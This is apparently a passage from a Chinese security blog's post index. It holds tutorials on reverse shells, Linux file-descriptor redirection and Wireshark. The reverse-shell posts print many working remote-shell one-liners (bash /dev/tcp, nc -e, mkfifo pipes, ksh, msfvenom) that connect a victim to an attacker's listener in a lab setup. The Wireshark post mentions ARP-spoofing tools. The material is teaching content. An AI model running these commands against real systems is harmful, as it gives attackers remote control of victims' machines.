$0|&amp;s;close(c)}}while(c!=”exit”);close(s)}}’</code></pre></li></ul></li><li><p>14.ksh反弹</p><ul><li><p>接收端：nc -lvvp 端口</p></li><li><p>发送端：</p><pre><code>ksh -c ‘ksh &gt;/dev/tcp/111.230.170.95/8080 2&gt;&amp;1 &lt;&amp;1’</code></pre></li></ul></li><li><p>15.msfvenom生成各种payload</p><ul><li><p>接收端：nc -lvvp 端口</p></li><li><p>查找</p><pre><code>payload：msfvenom -l payload |grep ‘cmd/unix/reverse’</code></pre></li></ul></li></ul><pre><code>* 生成  ```  payload：msfvenom -p cmd/unix/reverse_模块 lhost=接收端ip lport=接收端端口 R  ```</code></pre>]]></content>
      
      
      <categories>
          
          <category> 反弹shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell--2.反弹shell原理</title>
      <link href="/2020/03/30/fan-dan-shell-2-fan-dan-shell-yuan-li/"/>
      <url>/2020/03/30/fan-dan-shell-2-fan-dan-shell-yuan-li/</url>
      
        <content type="html"><![CDATA[<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p><strong>注意：本文主要参考文章：  <a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">https://xz.aliyun.com/t/2548</a>      <a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">https://xz.aliyun.com/t/2549</a></strong> </p><h4 id="1-什么是反弹shell"><a href="#1-什么是反弹shell" class="headerlink" title="1.什么是反弹shell"></a>1.什么是反弹shell</h4><ul><li>reverse shell，就是控制端监听在某TCP/UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。reverse shell与telnet，ssh等标准shell对应，本质上是网络概念的客户端与服务端的角色反转。 </li></ul><h4 id="2-为什么要反弹shell"><a href="#2-为什么要反弹shell" class="headerlink" title="2.为什么要反弹shell"></a>2.为什么要反弹shell</h4><ul><li>假设我们攻击了一台机器，打开了该机器的一个端口，攻击者在自己的机器去连接目标机器（目标ip：目标机器端口），这是比较常规的形式，我们叫做正向连接。远程桌面，web服务，ssh，telnet等等，都是正向连接。那么什么情况下正向连接不太好用了呢？ <ul><li>某客户机中了你的网马，但是它在局域网内，你直接连接不了</li><li>它的ip会动态改变，你不能持续控制</li><li>由于防火墙等限制，对方机器只能发送请求，不能接收请求</li><li>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，所以建立一个服务端，让恶意程序主动连接，才是上策</li></ul></li><li>攻击者指定服务端，受害者主机主动连接攻击者的服务端程序，就叫反弹连接</li></ul><h4 id="3-反弹shell的实现案例"><a href="#3-反弹shell的实现案例" class="headerlink" title="3.反弹shell的实现案例"></a>3.反弹shell的实现案例</h4><ul><li><p>实验环境：</p><ul><li>受害者：Ubuntu Linux  —-&gt;  192.168.74.135</li><li>攻击机：kali  Linux        —-&gt;  192.168.74.128</li></ul></li><li><p>常见语句：</p><ul><li><p>attacker：  <code>nc -lvp 5444</code></p></li><li><p>victim： <code>bash -i &gt;&amp; /dev/tcp/192.168.74.128/5444 0&gt;&amp;1</code></p></li></ul></li></ul><pre><code>&lt;img src=&quot;https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/12.png&quot; alt=&quot;image-20200321095749496&quot; style=&quot;zoom:80%;&quot; /&gt;</code></pre><ul><li>此时出现了victim的shell 终端</li></ul><ul><li><p>语句解释：</p><ul><li><p><code>bash -i</code> ： 产生交互式的shell </p></li><li><p><code>/dev/tcp/ip/port</code>：/dev/tcp|udp/ip/port 这个文件是特别特殊的，实际上可以将其看成一个设备（Linux下一切皆文件），其实如果你访问这个文件的位置他是不存在的<img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/13.png" alt="image-20200321100319457"></p></li></ul></li></ul><pre><code>但是如果你在一方监听端口的情况下对这个文件进行读写，就能实现与监听端口的服务器的socket通信&lt;img src=&quot;https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/15.png&quot; alt=&quot;image-20200321100656862&quot; style=&quot;zoom:80%;&quot; /&gt;&lt;img src=&quot;https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/14.png&quot; alt=&quot;image-20200321100612242&quot; style=&quot;zoom:80%;&quot; /&gt; 测试：攻击机上的输入 &lt;img src=&quot;https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/16.png&quot; alt=&quot;image-20200321101122955&quot; style=&quot;zoom:80%;&quot; /&gt;victim上的显示：&lt;img src=&quot;https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/17.png&quot; alt=&quot;image-20200321101215161&quot; style=&quot;zoom:80%;&quot; /&gt;</code></pre><h4 id="4-交互重定向"><a href="#4-交互重定向" class="headerlink" title="4. 交互重定向"></a>4. 交互重定向</h4><ul><li><p>为了实现交互，我们需要把受害者交互式shell的输出重定向到攻击机上</p><p>在受害者机器上输入 </p></li></ul><pre><code>bash -i &gt; /dev/tcp/192.168.74.128/5444</code></pre>  <img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/18.png" style="zoom:50%;" /><p> 如下图所示，任何在受害者机器上执行的指令都不会直接回显了，而是在攻击者机器上回显。</p><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/19.png" alt="image-20200321101906805" style="zoom:80%;" /><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/20.png" alt="image-20200321102039594" style="zoom: 50%;" /><p> 但是这里有一个问题，攻击者没有能够实现对受害者的控制，攻击者执行的命令没法在受害者电脑上执行。 </p><p>所以需要这样一条命令：</p><pre><code>bash -i &lt; /dev/tcp/192.168.74.128/5444</code></pre><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/21.png" style="zoom:50%;" /><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/22.png" alt="image-20200321102730619" style="zoom:80%;" /><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/23.png" alt="image-20200321102819150" style="zoom:80%;" /><p> 现在我们需要将两条指令结合起来（如果这条指令看不懂可以去看一下我上面提供的文章的链接再回来看这条指令）： </p><pre><code>bash -i &gt; /dev/tcp/192.168.74.128/5444 0&gt;&amp;1</code></pre><p> 由这张示意图可以很清楚地看到，输入0是由/dev/tcp/192.168.74.128/5444 输入的，也就是攻击机的输入，命令执行的结果1，会输出到/dev/tcp/192.168.74.128/5444上，这就形成了一个回路，实现了我们远程交互式shell 的功能 <img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/25.png" alt="image-20200321103122722" style="zoom: 80%;" /></p><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/26.png" alt="image-20200321103201540" style="zoom: 80%;" /><p><strong>注意：</strong><br>但是这里有一个问题，就是我们在受害者机器上依然能看到我们在攻击者机器中执行的指令 ，如下图所示，我们马上解决 </p><p><strong>使用<code>&gt;&amp;</code> 、 <code>&amp;&gt;</code></strong></p><pre><code>bash -i &gt; /dev/tcp/192.168.74.128/5444 0&gt;&amp;1 2&gt;&amp;1</code></pre><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.74.128/5444 0&gt;&amp;1</code></pre><p>至此，我们的反弹shell的经典语句就分析完了，通过这条语句的分析我们能大致的了解反弹shell的本质</p><h4 id="5-常见shell"><a href="#5-常见shell" class="headerlink" title="5.常见shell"></a>5.常见shell</h4><ul><li>第一种：</li></ul><pre><code>bash -i&gt;&amp; /dev/tcp/192.168.74.128/5444 0&gt;&amp;1</code></pre><pre><code>bash -i&gt;&amp; /dev/tcp/192.168.74.128/5444 0&lt;&amp;1</code></pre><p> 这里的唯一区别就是 0&gt;&amp;1 和 0&lt;&amp;1 ，其实就是打开方式的不同，而对于这个文件描述符来讲并没有什么区别 </p><ul><li>第二种：</li></ul><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.74.128/5444 &lt;&amp;2</code></pre><pre><code>bash -i &gt;&amp; /dev/tcp/192.168.74.128/5444 0&lt;&amp;2</code></pre><ul><li>第三种：</li></ul><pre><code>exec 5&lt;&gt;/dev/tcp/192.168.74.128/5444;cat &lt;&amp;5|while read line;do $line &gt;&amp;5 2&gt;&amp;1;done</code></pre><ul><li>解释：</li></ul><pre><code>  command|while read line do .....done  //原句：  while read line  do         …  done &lt; file</code></pre><p>  从文件中依次读取每一行，将其赋值给 line 变量（当然这里变量可以很多，以空格分隔，这里我就举一个变量的例子，如果是一个变量的话，那么一整行都是它的了），之后再在循环中对line进行操作。</p><p>  而现在我们不是从file 文件中输入了，我们使用管道符对攻击者机器上输入的命令依次执行，并将标准输出和标准错误输出都重定向到了文件描述符5，也就是攻击机上，实现交互式shell的功能。</p><p>  与上一句类似的命令：</p><pre><code>  0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/attackerip/4444; sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196</code></pre><ul><li>第四种：在nc版本正确的情况下，受害机直接用nc</li></ul><pre><code>nc -e /bin/sh 192.168.74.128 5444</code></pre><p>如果没有nc，可以用以下命令代替</p><pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.74.128  5444 &gt;/tmp/f</code></pre><ul><li>简单解释<ul><li>mkfifo 命令首先创建了一个管道，cat 将管道里面的内容输出传递给/bin/sh，sh会执行管道里的命令并将标准输出和标准错误输出结果通过nc 传到该管道，由此形成了一个回路 </li></ul></li></ul><pre><code>    mknod backpipe p; nc 192.168.74.128  5444 0&lt;backpipe | /bin/bash 1&gt;backpipe 2&gt;backpipe</code></pre><p>​    </p><h4 id="6-参考文章"><a href="#6-参考文章" class="headerlink" title="6.参考文章"></a>6.参考文章</h4><ul><li><a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">https://xz.aliyun.com/t/2549</a> </li><li><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a> </li><li><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a> </li><li><a href="https://blog.csdn.net/roler_/article/details/17504039" target="_blank" rel="noopener">https://blog.csdn.net/roler_/article/details/17504039</a> </li><li><a href="https://www.freebuf.com/articles/system/153986.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/153986.html</a> </li><li><a href="https://www.gnu.org/software/bash/manual/bash.pdf" target="_blank" rel="noopener">https://www.gnu.org/software/bash/manual/bash.pdf</a> </li><li>更多的反弹shell脚本： </li><li><a href="https://blog.csdn.net/qq_38684504/article/details/90047213" target="_blank" rel="noopener">https://blog.csdn.net/qq_38684504/article/details/90047213</a> </li><li><a href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html" target="_blank" rel="noopener">https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> 反弹shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell--1.文件描述符</title>
      <link href="/2020/03/30/fan-dan-shell-1-wen-jian-miao-shu-fu/"/>
      <url>/2020/03/30/fan-dan-shell-1-wen-jian-miao-shu-fu/</url>
      
        <content type="html"><![CDATA[<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><h4 id="1-文件描述符"><a href="#1-文件描述符" class="headerlink" title="1.文件描述符"></a>1.文件描述符</h4><ul><li><p><strong>linux文件描述符</strong>：可以理解为linux跟踪打开文件，而分配的一个数字，这个数字有点类似c语言操作文件时候的句柄，通过句柄就可以实现文件的读写操作。 </p></li><li><p>三个默认的文件描述符</p><ul><li>标准输入：standard input 0   （默认设备键盘）</li><li>标准输出：standard output 1（默认设备显示器）</li><li>错误输出：error output 2       （默认设备显示器）</li></ul></li><li><p><strong>注意：</strong></p><p>（1）以后再打开文件，描述符可以依次增加<br>（2）一条shell命令，都会继承其父进程的文件描述符，因此所有的shell命令，都会默认有三个文件描述符。</p><p>（3） 文件所有输入输出都是由该进程所有打开的文件描述符控制的。（Linux一切皆文件，就连键盘显示器设备都是文件，因此他们的输入输出也是由文件描述符控制） </p><p>（4） 一条命令执行以前先会按照默认的情况进行绑定（也就是上面所说的 0,1,2），如果我们有时候需要让输出不显示在显示器上，而是输出到文件或者其他设备，那我们就需要重定向。 </p><p>（5）下面的学习注意理解重定向的含义。将标准的重定向到自定义的。</p></li></ul><h4 id="2-重定向"><a href="#2-重定向" class="headerlink" title="2.重定向"></a>2.重定向</h4><ul><li><p>输入重定向 ：<code>&lt;</code>、 <code>&lt;&lt;</code></p></li><li><p>输出重定向 ：<code>&gt;</code>、 <code>&gt;&gt;</code></p></li><li><p>注意：此处涉及到shell的解析原理，仅做简单介绍</p><ul><li>bash 在执行一条指令的时候，首先<strong>会检查命令中存不存在重定向</strong>的符号，如果存在那么首先将文件描述符重定向（之前说过了，输入输出操作都是依赖文件描述符实现的，重定向输入输出本质上就是重定向文件描述符），<strong>然后再把重定向去掉，执行指令</strong> </li><li>如果指令中存在多个重定向，那么不要随便改变顺序，因为重定向是从左向右解析的，改变顺序可能会带来完全不同的结果</li><li><code>&lt;</code> 是对标准输入 0 重定向 ，<code>&gt;</code> 是对标准输出 1 重定向 </li><li>再强调一下， <strong>重定向就是针对文件描述符的操作</strong> </li></ul></li></ul><h4 id="3-输入重定向"><a href="#3-输入重定向" class="headerlink" title="3.输入重定向"></a>3.输入重定向</h4><ul><li><p>格式： <code>[n]&lt; file</code>：n是文件描述符。<strong>[]与&lt;之间没有空格</strong></p></li><li><p>说明：将文件描述符 n 重定向到 word 指代的文件（以只读方式打开），如果n省略就是0（标准输入、键盘）</p></li></ul><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/1.png" style="zoom:80%;" /><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/2.png" style="zoom: 80%;" /><ul><li>解释：解析器解析到 “&lt;” 以后会先处理重定向，将标准输入重定向到file，之后cat再从标准输入读取指令的时候，由于标准输入已经重定向到了file ，于是cat就从file中读取指令了。第二张图片，先定义了重定向，然后读cat文件</li></ul><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/3.png" style="zoom:50%;" /><h4 id="4-输出重定向"><a href="#4-输出重定向" class="headerlink" title="4.输出重定向"></a>4.输出重定向</h4><ul><li>格式： <code>[n]&gt; file</code></li><li>说明： 将文件描述符 n 重定向到word 指代的文件（以写的方式打开），如果n 省略则默认就是 1（标准输出） </li></ul><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/4.png" style="zoom:80%;" /><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/5.png" style="zoom:80%;" /><ul><li>第二张图同样是 先进行重定向，然后使用echo命令</li></ul><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/6.png" style="zoom: 50%;" /><h4 id="5-标准输出与标准错误输出重定向"><a href="#5-标准输出与标准错误输出重定向" class="headerlink" title="5.标准输出与标准错误输出重定向"></a>5.标准输出与标准错误输出重定向</h4><ul><li>格式： <code>&amp;&gt; word</code> 、<code>&gt;&amp; word</code> </li><li>说明：将<strong>标准输出</strong>与<strong>标准错误输出</strong>都定向到word代表的文件（以写的方式打开），两种格式意义完全相同，这种格式完全等价于 <code>&gt; word 2&gt;&amp;1</code> (2&gt;&amp;1 是将标准错误输出复制到标准输出，<strong>&amp;是为了区分文件1和文件描述符1</strong>的) </li></ul><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/7.png" style="zoom:80%;" /><ul><li>解释：我们首先执行了一个错误的命令，可以看到错误提示被写入文件（正常情况下是会直接输出的），我们又执行了一条正确的指令，发现结果也输入到了文件，说明正确错误消息都能输出到文件。（<strong><code>&amp;&gt;</code>是混合错误输出重定向</strong>）</li></ul><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/8.png" style="zoom:50%;" /><h4 id="6-文件描述符的复制"><a href="#6-文件描述符的复制" class="headerlink" title="6.文件描述符的复制"></a>6.文件描述符的复制</h4><ul><li><p>格式： <code>[n]&lt;&amp;[m]</code>、<code>[n]&gt;&amp;[m]</code> <strong>(这里的所有字符之间不能有空格)</strong> </p></li><li><p>说明：</p><ul><li>这里两个<strong>都是将文件描述符 n 复制到 m</strong> ，两者的区别是，前者是以只读的形式打开，后者是以写的形式打开 </li><li>这里的&amp; 目的是为了区分数字名字的文件和文件描述符，如果没有&amp; 系统会认为是将文件描述符重定向到了一个数字作为文件名的文件，而不是一个文件描述符 </li></ul></li><li><p>一定要注意：重定向符号不能随意换位置</p><ul><li>cmd &gt; file 2&gt;&amp;1</li><li>cmd 2&gt;&amp;1  &gt;file </li><li>第二句的意思是，先将标准错误输出重定向到1（显示器），然后将标准输出重定向到file，与第一句不同</li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/9.png" style="zoom:50%;" /></li></ul></li></ul><h4 id="7-exec-绑定重定向"><a href="#7-exec-绑定重定向" class="headerlink" title="7. exec 绑定重定向"></a>7. exec 绑定重定向</h4><ul><li><p>格式：<code>exec [n]&lt; file/[n]</code>、<code>exec &gt; file/[n]</code> </p></li><li><p>注意：</p><ul><li>格式： <code>exec [n]&lt;&gt;file</code> </li><li>说明：以读写方式打开file指代的文件，并将n重定向到该文件。如果n不指定的话，默认为标准输入。 </li><li>exec仅仅对随后的一条重定向指令有效，第二条向后就失效了</li></ul></li></ul><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/10.png" style="zoom:80%;" /><img src="https://gitee.com/lingying177/blogimage/raw/master/img/rev-shell/11.png" style="zoom:80%;" /><h4 id="8-HERE文件"><a href="#8-HERE文件" class="headerlink" title="8.HERE文件"></a>8.HERE文件</h4><ul><li><p>格式：<code>&lt;&lt;[-]EOF</code>，</p></li><li><p>说明：指定shell从当前输入源中读入行直至遇到<strong>仅包含EOF</strong>的一行（EOF后面也不能有空白符），然后所有读入的内容（不包括最后一行）作为标准输入传递给指令。<strong>‘-‘</strong>的作用是将每一行前面的tab去除后再读入。需要注意的是这个<strong>EOF</strong>不会进行任何扩展，但是如果EOF中没有字符没引号扩起来，那么here-document中的内容可以进行参数扩展、指令替换以及算术扩展（parameterexpansion, command substitution, and arithmeticexpansion）；只要有任一字符被引号扩起来，delimiter仍是将去除引号的EOF，但是输入行不会进行任何扩展。</p></li><li><p>示例：</p></li><li><pre class=" language-shell"><code class="language-shell">$ cat <<EOF> $(pwd)     # 指令替换> `pwd`      # 指令替换的第2种形式> $HOME      # 参数扩展> $((4+5))   # 算数扩展> EOF/home/leo        //此处开始扩展/home/leo/home/leo9$ cat <<"EOF"> $(ls)> `pwd`> $HOME> $((4+5))> EOF$(ls)              //因为EOF有双引号，所以不会被扩展`pwd`$HOME$((4+5))</code></pre></li></ul><h4 id="9-HERE字符串"><a href="#9-HERE字符串" class="headerlink" title="9.HERE字符串"></a>9.HERE字符串</h4><ul><li><p>格式：<code>&lt;&lt;&lt;word</code></p></li><li><p>说明：将扩展后的<strong>word</strong>作为标准输入传递给指令。</p><ul><li><p>举例：使用这个功能可以将指令</p><p>echo ‘something’ |command</p><p>通过下面这种方式来实现</p><p>command &lt;&lt;&lt;’something’</p></li></ul></li></ul><h4 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h4><ul><li><a href="https://xz.aliyun.com/t/2548" target="_blank" rel="noopener">https://xz.aliyun.com/t/2548</a> </li><li><a href="https://xz.aliyun.com/t/2549" target="_blank" rel="noopener">https://xz.aliyun.com/t/2549</a> </li><li><a href="https://blog.csdn.net/ccwwff/article/details/48519119" target="_blank" rel="noopener">https://blog.csdn.net/ccwwff/article/details/48519119</a> </li><li><a href="https://www.cnblogs.com/chengmo/archive/2010/10/20/1855805.html" target="_blank" rel="noopener">https://www.cnblogs.com/chengmo/archive/2010/10/20/1855805.html</a> </li><li><a href="http://www.178linux.com/54471" target="_blank" rel="noopener">http://www.178linux.com/54471</a> </li></ul>]]></content>
      
      
      <categories>
          
          <category> 反弹shell </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> 反弹shell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WireShark简单使用</title>
      <link href="/2020/03/26/wireshark-jian-dan-shi-yong/"/>
      <url>/2020/03/26/wireshark-jian-dan-shi-yong/</url>
      
        <content type="html"><![CDATA[<h3 id="Wireshark基础"><a href="#Wireshark基础" class="headerlink" title="Wireshark基础"></a>Wireshark基础</h3><h4 id="1-wireshark-的使用场景"><a href="#1-wireshark-的使用场景" class="headerlink" title="1.wireshark 的使用场景"></a>1.wireshark 的使用场景</h4><h5 id="1-1-远程捕获："><a href="#1-1-远程捕获：" class="headerlink" title="1.1 远程捕获："></a>1.1 远程捕获：</h5><ul><li>拥有服务器权限时：<ul><li>在目标服务器使用wincap，将数据发送到一个地址</li><li>使用wireshark创建一个新的网卡进行监听（捕获 –&gt; 选项  –&gt;  管理接口 ）</li><li>使用wireshark分析流量</li></ul></li><li>拥有交换机权限时：<ul><li>使用端口镜像功能（在交换机上进行配置）</li><li>配置</li></ul></li><li>没有权限时：ARP 欺骗<ul><li>arpspoof</li><li>cain</li><li>ettcap</li></ul></li><li>网络分路器：硬件</li></ul><h5 id="1-2-本地捕获："><a href="#1-2-本地捕获：" class="headerlink" title="1.2 本地捕获："></a>1.2 本地捕获：</h5><ul><li>Rawcap：抓取本地还回地址（127.0.0.1）</li></ul><h5 id="1-3-虚拟机流量捕获："><a href="#1-3-虚拟机流量捕获：" class="headerlink" title="1.3 虚拟机流量捕获："></a>1.3 虚拟机流量捕获：</h5><ul><li>直接选择相应的网卡</li></ul><h4 id="2-显示过滤器"><a href="#2-显示过滤器" class="headerlink" title="2.显示过滤器"></a>2.显示过滤器</h4><h5 id="2-1-打开方式"><a href="#2-1-打开方式" class="headerlink" title="2.1 打开方式"></a>2.1 打开方式</h5><ul><li>过滤器工具栏（主页面工具栏下方（比较常用））</li><li>分析  ==&gt;  Display Filter (显示过滤器)</li><li>分析  ==&gt;  Display Filter Expression(显示过滤器表达式)</li><li>点击相关数据包后，选择某一字节作为过滤器（数据包细节面板）</li></ul><h5 id="2-2-语法（伯克利包过滤规则）"><a href="#2-2-语法（伯克利包过滤规则）" class="headerlink" title="2.2 语法（伯克利包过滤规则）"></a>2.2 语法（伯克利包过滤规则）</h5><ul><li>官方手册：<a href="https://www.wireshark.org/docs/wsug_html_chunked/" target="_blank" rel="noopener">https://www.wireshark.org/docs/wsug_html_chunked/</a></li><li>过滤器表达式由一个或多个原语组成。原语通常由一个id(名称或数字)和一个或多个限定符组成<ul><li>type：限制id名称，例如：host、net、port、portrange</li><li>dir：表示方向，例如：src、dst、src and dst、 ra、ta、addr1、addr2</li><li>proto：限制协议，例如：ether、fddi、 tr、 wlan、 ip、 ip6、 arp、 rarp、 decnet、 tcp and udp.</li></ul></li><li>顺序：<code>[proto] [dir] [type]</code></li><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/WIRESHARK/格式.png" style="zoom:50%;" /></li><li>特殊的过滤方法：<code>ip[12:4]</code></li><li>常用规则： <ul><li><a href="https://www.tcpdump.org/manpages/pcap-filter.7.html" target="_blank" rel="noopener">https://www.tcpdump.org/manpages/pcap-filter.7.html</a></li><li><a href="https://www.wireshark.org/docs/wsug_html_chunked/ChWorkBuildDisplayFilterSection.html" target="_blank" rel="noopener">https://www.wireshark.org/docs/wsug_html_chunked/ChWorkBuildDisplayFilterSection.html</a>  </li><li><code>dst/src host &lt;host&gt;、host &lt;host&gt;、ether dst/src &lt;ehost&gt;、gateway host &lt;host&gt; 、dst/src net &lt;net(子网)&gt;、</code></li><li><code>dst/src port &lt;port&gt;、port &lt;port&gt;、dst/src portrange &lt;port1-port2&gt;</code></li><li><code>less &lt;length&gt;、greater &lt;length&gt;</code></li><li><code>ip proto &lt;protocol&gt;、ip6 proto &lt;protocal&gt;、tcp、udp、icmp</code> </li><li><strong>注意：只能是小写</strong></li></ul></li></ul><h4 id="3-时间显示功能"><a href="#3-时间显示功能" class="headerlink" title="3.时间显示功能"></a>3.时间显示功能</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/WIRESHARK/wireshark-时间.png" style="zoom:50%;" /></li></ul><h4 id="4-自定义显示列"><a href="#4-自定义显示列" class="headerlink" title="4.自定义显示列"></a>4.自定义显示列</h4><img src="https://gitee.com/lingying177/blogimage/raw/master/img/WIRESHARK/wireshark-过滤器.png" style="zoom:50%;" /><h4 id="5-地址解析"><a href="#5-地址解析" class="headerlink" title="5.地址解析"></a>5.地址解析</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/WIRESHARK/image-20200205182659041.png" style="zoom: 50%;" /></li></ul><h4 id="6-内部协议及识别协议的方法"><a href="#6-内部协议及识别协议的方法" class="headerlink" title="6.内部协议及识别协议的方法"></a>6.内部协议及识别协议的方法</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/WIRESHARK/wireshark-内部协议.png" style="zoom:50%;" /></li></ul><h4 id="7-显示过滤器"><a href="#7-显示过滤器" class="headerlink" title="7.显示过滤器"></a>7.显示过滤器</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/WIRESHARK/wireshark-显示过滤器.png" style="zoom:50%;" /></li></ul><h4 id="8-统计及绘图"><a href="#8-统计及绘图" class="headerlink" title="8.统计及绘图"></a>8.统计及绘图</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/WIRESHARK/wireshark-%E7%BB%9F%E8%AE%A1.png" alt=""></li></ul><h4 id="9-防火墙规则和-lua语言"><a href="#9-防火墙规则和-lua语言" class="headerlink" title="9.防火墙规则和 lua语言"></a>9.防火墙规则和 <code>lua</code>语言</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/WIRESHARK/wireshark-防火墙规则.png" style="zoom:50%;" /></li></ul><h4 id="10-专家信息"><a href="#10-专家信息" class="headerlink" title="10.专家信息"></a>10.专家信息</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/WIRESHARK/专家模式.png" style="zoom:50%;" /></li></ul><h4 id="11-TCP追踪流"><a href="#11-TCP追踪流" class="headerlink" title="11.TCP追踪流"></a>11.TCP追踪流</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/WIRESHARK/wireshark-追踪流.png" style="zoom:50%;" /></li></ul><h4 id="12-协议分级–conversation–流量图等"><a href="#12-协议分级–conversation–流量图等" class="headerlink" title="12.协议分级–conversation–流量图等"></a>12.协议分级–conversation–流量图等</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/WIRESHARK/协议分级-conversation-流量图.png" style="zoom:50%;" /></li><li><p>流量图需要配置：</p><ul><li>首选项 ==&gt;  protocol</li><li>通过对协议的显示进行配置，打开或关闭某些功能，具体使用看环境</li></ul></li></ul><h4 id="13-首选项"><a href="#13-首选项" class="headerlink" title="13.首选项"></a>13.首选项</h4><ul><li><img src="https://gitee.com/lingying177/blogimage/raw/master/img/WIRESHARK/wireshark-首选项.png" style="zoom:50%;" /></li></ul><h4 id="14-针对交换机的攻击"><a href="#14-针对交换机的攻击" class="headerlink" title="14. 针对交换机的攻击"></a>14. 针对交换机的攻击</h4><ul><li>MAC地址欺骗</li><li>MAC地址泛洪攻击<ul><li>CAM表满了以后，退化为集线器，进行广播</li><li>分析抓包文件后发现几乎没有TCP 或 UDP 数据包，仅有Ethernet数据包</li></ul></li><li>STP操纵攻击</li><li>广播风暴攻击</li></ul><h4 id="15-中间人攻击"><a href="#15-中间人攻击" class="headerlink" title="15.中间人攻击"></a>15.中间人攻击</h4><ul><li>攻击终端设备的ARP缓存表</li><li>通过 专家系统  ，分析出为ARP协议漏洞，双向欺骗</li><li>《分别告诉A和B，我是B和A》</li><li>arp -s  ip地址 mac地址</li><li>防御：<ul><li>静态绑定ARP</li><li>使用DHCP</li><li>划分VLAN</li><li>ARP防火墙</li></ul></li></ul><h4 id="16-针对IP协议的攻击（泪滴攻击）"><a href="#16-针对IP协议的攻击（泪滴攻击）" class="headerlink" title="16.针对IP协议的攻击（泪滴攻击）"></a>16.针对IP协议的攻击（泪滴攻击）</h4><ul><li>IP数据包在被攻击者上进行拼接组装时，有重复内容，导致系统崩溃</li><li>此处分析  IP数据包的大小及分割格式就可以</li><li>ip数据包通过identification标识来确定是否为同一数据，通过flags标志后的片位移来判断该数据包相对于首数据包的偏移量</li></ul><h4 id="17-分析SYN、UDP-flooding攻击、拒绝服务攻击等"><a href="#17-分析SYN、UDP-flooding攻击、拒绝服务攻击等" class="headerlink" title="17.分析SYN、UDP flooding攻击、拒绝服务攻击等"></a>17.分析SYN、UDP flooding攻击、拒绝服务攻击等</h4><ul><li>通过流量图进行分析</li><li>通过  统计==&gt; i/o图表  分析</li></ul><h4 id="18-网络取证中的应用"><a href="#18-网络取证中的应用" class="headerlink" title="18.网络取证中的应用"></a>18.网络取证中的应用</h4><ul><li>导出数据：<ul><li>显示为：原始数据</li><li>然后选中要导出的数据 –&gt;  右键 –&gt; 保存为文件  xxx.bin</li><li>注意：OD OA 是换行</li><li>使用winhex编辑 xxx.bin</li><li>删除请求头数据以及odoa换行，保存为  